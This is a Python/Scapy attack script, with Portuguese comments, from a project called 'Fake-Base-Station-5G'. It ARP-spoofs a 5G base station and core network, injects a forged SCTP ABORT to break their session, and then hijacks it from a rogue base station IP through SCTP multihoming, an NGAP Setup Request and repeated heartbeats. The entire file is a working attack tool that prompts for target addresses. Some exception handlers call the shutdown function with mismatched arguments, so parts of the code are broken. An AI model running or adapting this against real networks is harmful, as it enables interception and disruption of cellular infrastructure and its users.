#Projeto Fake-Base-Station-5G
#Criado por Roger W. Coêlho
#Código Ataque de Sequestro de Sessão SCTP 5G com Multihoming


from scapy.all import ARP, send, getmacbyip, sr1, sniff
import sys
import time
import random
from scapy.layers.sctp import SCTP, SCTPChunkAbort, SCTPChunkInit, SCTPChunkParamIPv4Addr, SCTPChunkParamFwdTSN, SCTPChunkParamECNCapable, SCTPChunkParamHeartbeatInfo, SCTPChunkShutdown, SCTPChunkData, SCTPChunkInitAck
from scapy.layers.sctp import SCTPChunkParamSupportedAddrTypes, SCTPChunkCookieEcho, SCTPChunkSACK, SCTPChunkParamStateCookie, SCTPChunkHeartbeatAck, SCTPChunkHeartbeatReq, SCTPChunkShutdownComplete
from scapy.layers.inet import IP
from scapy.contrib import gtp
from NGAP import NGAP
from Heartbeat import heartbeat


#Função Arp Spoofing
def spoofing(target1, target2, target1MAC):

    arp_reply = ARP(pdst=target1, hwdst=target1MAC, psrc=target2, op=2)
    send(arp_reply, verbose=0)


#Função de parada do Arp Spoofing
def stop_spoofing(target1, target2, target1MAC, target2MAC):

    arp_reply = ARP(pdst=target1, hwdst=target1MAC, psrc=target2, hwsrc=target2MAC, op=2)
    send(arp_reply, verbose=0, count=4)


#Função de envio de ABORT SCTP
def abort_sctp_spoofing(target1, target2, src, dst, verfication_tag):
    
    vtag = int(verfication_tag, 16)

    send(IP(src = target1, dst = target2, flags=2, id=0, tos=0x02)/SCTP(sport = int(src), dport = dst, tag = vtag)/SCTPChunkAbort(type=6, reserved=None, TCB=0, len=None, error_causes=b''))


#Função de envio de INIT SCTP Multihoming
def multihoming_sctp_init(target1, target2, target3, src, dst, initial_tsn, initial_tag):
    
    print("[!] Enviando Init...")
    
    p = sr1(IP(src = target3, dst = target2, flags=2, id=0, tos=0x02)/SCTP(sport = int(src), dport = dst, tag = 0)/
         SCTPChunkInit(type=1, flags=None, len=None, init_tag=initial_tag, a_rwnd=106496, n_out_streams=10, n_in_streams=10, init_tsn= initial_tsn, 
                       params=[SCTPChunkParamIPv4Addr(type=5, len=8, addr=target3), SCTPChunkParamIPv4Addr(type=5, len=8, addr=target1), 
                               SCTPChunkParamSupportedAddrTypes(type=12, len=None, addr_type_list=[6,5]),
                               SCTPChunkParamECNCapable(type=32768, len=4),
                               SCTPChunkParamFwdTSN(type=49152, len=4)]))
    
    print("[!] Recebendo Init_Ack...")
    initial_tag= p[SCTP].init_tag
    tsn_ngresponse = (p[SCTP]/p[SCTPChunkInitAck]).init_tsn
    cookie_state = (p[SCTP]/p[SCTPChunkParamStateCookie]).cookie
    
    print("[!] Enviando o Cookie_Echo...")
    coockie_echo_sctp(target1, target2, target3, src, dst, initial_tag, cookie_state, initial_tsn, tsn_ngresponse)


#Função de envio Cookie_Echo SCTP 
def coockie_echo_sctp(target1, target2, target3, src, dst, initial_tag, cookie_state, initial_tsn, tsn_ngresponse):
       
    send(IP(src = target3, dst = target2, flags=2, id=0, tos=0x02)/SCTP(sport = int(src), dport = dst, tag = initial_tag)/
       SCTPChunkCookieEcho(type=10, flags=None, len=None, cookie=cookie_state))
    
    print("[!] Recebendo Cookie_ACK...")

    ngap_5g(target1, target2, target3, src, dst, initial_tag, initial_tsn, tsn_ngresponse)

    
#Função PDU NGAP Setup Request
def ngap_5g(target1, target2, target3, src, dst, initial_tag, initial_tsn, tsn_ngresponse):

    print("[!] Enviando NGAPSetupRequest...")

    send(IP(src = target3, dst = target2, flags=2, id=0, tos=0x02)/SCTP(sport = int(src), dport = int(dst), tag = initial_tag)/
            SCTPChunkData(type=0, reserved=None, delay_sack=0, unordered=0, beginning=1, ending=1, len=None, tsn=initial_tsn, stream_id=None, stream_seq=0, proto_id=60, 
                          data=gtp.GTPCreatePDPContextRequest(IE_list=NGAP.NGSetupRequest().PDU_NGSetupResquest)))

    print("[!] Recebendo SACK...")

    time.sleep(2)

    sack_sctp_cliente(target1, target2, target3, src, dst, initial_tag, tsn_ngresponse)


#Função SACK SCTP
def sack_sctp_cliente(target1, target2, target3, src, dst, initial_tag, tsn_ngresponse):

    print("[!] Recebendo NGAPSetupResponse...")
    print("[!] Enviando Sack...")

    p = sr1(IP(src = target3, dst = target2, flags=2, id=0, tos=0x02)/SCTP(sport = int(src), dport = dst, tag = initial_tag)/
         SCTPChunkSACK(type=3, flags=None, len=None, cumul_tsn_ack=tsn_ngresponse, a_rwnd=106442, n_gap_ack=0, n_dup_tsn=0, gap_ack_list=[], dup_tsn_list=[]))

    heartbeat_info = (p[SCTP]/p[SCTPChunkHeartbeatReq]/p[SCTPChunkParamHeartbeatInfo]).data

    heartbeat_ack_sctp(target1, target2, target3, src, dst, initial_tag, heartbeat_info, tsn_ngresponse)

    
#Função de Heartbeat_Ack SCTP
def heartbeat_ack_sctp(target1, target2, target3, src, dst, initial_tag, heartbeat_info, tsn_ngresponse):

    try:
        
        for i in range (6):

            if i == 5:

                print("[!] Enviando o Hertbeat_Ack...")

                p = sr1(IP(src = target3, dst = target2, flags=2, id=0, tos=0x02)/SCTP(sport = int(src), dport = dst, tag = initial_tag)/
                     SCTPChunkHeartbeatAck(type=5, flags=None, len=None, params=[SCTPChunkParamHeartbeatInfo(type=1, len=None, data=heartbeat_info)])) 
                
                heartbeat_info = (p[SCTP]/p[SCTPChunkHeartbeatReq]/p[SCTPChunkParamHeartbeatInfo]).data 

                break  

            else:

                print("[!] Enviando o Hertbeat_Ack...")

                p = sr1(IP(src =target3, dst = target2, flags=2, id=0, tos=0x02)/SCTP(sport = int(src), dport = dst, tag = initial_tag)/
                        SCTPChunkHeartbeatAck(type=5, flags=None, len=None, params=[SCTPChunkParamHeartbeatInfo(type=1, len=None, data=heartbeat_info)]))
                
                heartbeat_info = (p[SCTP]/p[SCTPChunkHeartbeatReq]/p[SCTPChunkParamHeartbeatInfo]).data 

            print("[!] Recebendo o Hertbeat...") 
                
        heartbeat_sctp(target1, target2, target3, src, dst, initial_tag, tsn_ngresponse)

    except KeyboardInterrupt:

        print("[!] CTRL+C Detectado! Desconectando ERB 5G, por favor espere...")
        shutdown_sctp(target1, target2, target3, src, dst, initial_tag, tsn_ngresponse)
    
    except TypeError:

        print("[!] CTRL+C Detectado! Desconectando ERB 5G, por favor espere...")
        shutdown_sctp(target1, target2, target3, target3, src, dst, initial_tag, tsn_ngresponse)
        

#Função de Heartbeat SCTP
def heartbeat_sctp(target1, target2, target3, src, dst, initial_tag, tsn_ngresponse):

    try:
        print("[!] Enviando o Hertbeat...")

        heartbeat_info_client = heartbeat.Heartbeat.heartbeat_info_client(target2, dst)

        send(IP(src = target3, dst = target2, flags=2, id=0, tos=0x02)/SCTP(sport = int(src), dport = dst, tag = initial_tag)/
           SCTPChunkHeartbeatReq(type=4, flags=None, len=None, params=[SCTPChunkParamHeartbeatInfo(type=1, len=None, data=heartbeat_info_client)]))
        
        print("[!] Recebendo o Hertbeat_Ack...")
        print("[!] Recebendo o Hertbeat...")

        valor = sniff(1, filter="sctp and src " + target2)
        
        heartbeat_info = (valor[0][SCTP]/valor[0][SCTPChunkHeartbeatReq]/valor[0][SCTPChunkParamHeartbeatInfo]).data
        
        heartbeat_ack_sctp(target1, target2, target3, src, dst, initial_tag, heartbeat_info, tsn_ngresponse)
  
    except KeyboardInterrupt:

        print("[!] CTRL+C Detectado! Desconectando ERB 5G, por favor espere...")
        shutdown_sctp(target2, target3, src, dst, initial_tag, tsn_ngresponse)
    
    except TypeError:

        print("[!] [!] CTRL+C Detectado! Desconectando ERB 5G, por favor espere...")
        shutdown_sctp(target2, target3, src, dst, initial_tag, tsn_ngresponse)


#Função SHUTDOWN SCTP
def shutdown_sctp(target2, target3, src, dst, initial_tag, tsn_ngresponse):
    
    print("[!] Enviando o Shutdown...")
    send(IP(src = target3, dst = target2, flags=2, id=0, tos=0x02)/SCTP(sport = int(src), dport = dst, tag = initial_tag)/
         SCTPChunkShutdown(type=7, flags=None, len=8, cumul_tsn_ack=tsn_ngresponse))
    
    time.sleep(2)
    
    print("[!] Recebendo o Shurdown_ACK...")
    shutdown_completo_sctp(target2, target3, src, dst, initial_tag)

    
#Função SHUTDOWN_COMPLETO SCTP
def shutdown_completo_sctp(target2, target3, src, dst, initial_tag):
    
    print("[!] Enviando o Shurdown Completo...")
    send(IP(src = target3, dst = target2, flags=2, id=0, tos=0x02)/SCTP(sport = int(src), dport = dst, tag = initial_tag)/
                 SCTPChunkShutdownComplete(type=14, reserved=None, TCB=0, len=4))


#Função Main
def main():
    
    try:

        print("ARP Spoofing Multihoming Iniciado!!!")
        
        ip_erb = input("Entre com o endereço IP da ERB: ")
        ip_amf = input("Entre com o endereço IP do Núcleo 5G: ")
        ip_erbfalsa = input("Entre com o endereço IP da ERB Falsa: ")
        source_port = input("Informe a porta do cliente NGAP da ERB: ")
        destination_port = 38412 #Porta Servidor NGAP
        vtag_sctp = input("Informe a Verification Tag da sessão SCTP entre a ERB e o Núcleo 5G: ")

        target1 = ip_erb
        target2 = ip_amf
        target3 = ip_erbfalsa
        initial_tsn = random.randrange(0000000000,4294967295)
        initial_tag = random.randrange(111111111,999999999)
       
        try:
            target1MAC = str(getmacbyip(target1))
            target2MAC = str(getmacbyip(target2))
        except OSError:
            print("Certifique-se de digitar os endereços IP corretamente!!!")
            sys.exit(1)
        

        #Arp Spoofing envio de ABORT
        spoofing(target1, target2, target1MAC)
        spoofing(target2, target1, target2MAC)

        print("[!] Enviando Pacotes ARP Spoofing ABORT SCTP...")

        abort_sctp_spoofing(target1, target2, source_port, destination_port, vtag_sctp)

        #Sequestro de Sessão com o Multihoming
        multihoming_sctp_init(target1, target2, target3, source_port, destination_port, initial_tsn, initial_tag)   

        stop_spoofing(target1, target2, target1MAC, target2MAC)
        stop_spoofing(target2, target1, target2MAC, target1MAC)

        print("[!] Enviando Pacotes ARP Spoofing Multihoming SCTP...")   
        

    except KeyboardInterrupt:        
        print()
        print("[!] CTRL+C Detectado!!!")

    except TypeError:
        print()
        print("[!] Erro Detectado!!!")
    
    print("ARP Spoofing SCTP Multihoming Finalizado!!!")
    

if __name__ == "__main__":
    main()